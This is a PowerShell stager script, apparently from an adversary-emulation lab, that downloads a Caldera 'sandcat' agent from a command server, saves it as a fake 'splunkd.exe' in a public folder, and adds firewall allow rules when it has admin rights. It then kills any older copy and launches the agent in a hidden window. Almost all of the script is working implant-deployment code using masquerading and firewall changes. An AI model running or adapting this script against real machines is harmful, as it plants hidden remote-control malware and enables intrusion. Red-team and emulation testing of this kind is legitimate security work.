# =========================
# Config
# =========================
$Server = "http://192.168.56.1:8888"
$DownloadUrl = "$Server/file/download"
$AgentPath = "C:\Users\Public\splunkd.exe"
$AgentArgs = "-server $Server -group ttps10"
$LockFile = "C:\Users\Public\splunkd.lock"

# =========================
# 1. 현재 권한 확인
# =========================
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# =========================
# 2. 방화벽 규칙 추가 (관리자 권한일 때만)
# =========================
if ($isAdmin) {
    Write-Host "[*] Configuring firewall..."
    try {
        # PowerShell 실행 허용
        netsh advfirewall firewall add rule name="PowerShell Execution" dir=in action=allow program="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" enable=yes profile=any | Out-Null
        
        # 에이전트 실행 허용
        netsh advfirewall firewall add rule name="Agent Execution" dir=in action=allow program="$AgentPath" enable=yes profile=any | Out-Null
        
        Write-Host "[+] Firewall rules added"
    } catch {
        Write-Host "[-] Firewall configuration failed: $_"
    }
}

# =========================
# 3. 에이전트 실행 중인지 확인
# =========================
$agentProcess = Get-Process -ErrorAction SilentlyContinue | 
    Where-Object { $_.Path -ieq $AgentPath } | 
    Select-Object -First 1

if ($agentProcess) {
    Write-Host "[*] Agent process found (PID: $($agentProcess.Id))"
    
    if (-not $isAdmin) {
        Write-Host "[*] Agent already running, exiting"
        exit 0
    }
    
    if (Test-Path $LockFile) {
        $lockContent = Get-Content $LockFile -ErrorAction SilentlyContinue
        Write-Host "[*] Lock file exists: $lockContent"
        
        if ($lockContent -eq "admin" -or $lockContent -eq "elevated") {
            Write-Host "[*] Agent already running with elevated privileges, exiting"
            exit 0
        }
        
        Write-Host "[*] Agent running as regular user, will upgrade"
    }
}

# =========================
# 4. 에이전트 다운로드
# =========================
Write-Host "[*] Downloading agent..."
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("platform", "windows")
    $wc.Headers.Add("file", "sandcat.go")
    $data = $wc.DownloadData($DownloadUrl)
} catch {
    Write-Host "[-] Download failed: $_"
    exit 1
}

# =========================
# 5. 기존 에이전트 중지
# =========================
if ($agentProcess) {
    Write-Host "[*] Stopping existing agent (PID: $($agentProcess.Id))..."
    Stop-Process -Id $agentProcess.Id -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Remove-Item -Force $LockFile -ErrorAction SilentlyContinue
}

# =========================
# 6. 에이전트 설치 및 실행
# =========================
Write-Host "[*] Installing agent..."
Remove-Item -Force $AgentPath -ErrorAction SilentlyContinue
[System.IO.File]::WriteAllBytes($AgentPath, $data)

if ($isAdmin) {
    Write-Host "[*] Starting agent with elevated privileges..."
    "elevated" | Out-File -FilePath $LockFile -Force
} else {
    Write-Host "[*] Starting agent as regular user..."
    "regular" | Out-File -FilePath $LockFile -Force
}

Start-Process -FilePath $AgentPath -ArgumentList $AgentArgs -WindowStyle Hidden
Write-Host "[+] Agent deployed"
exit 0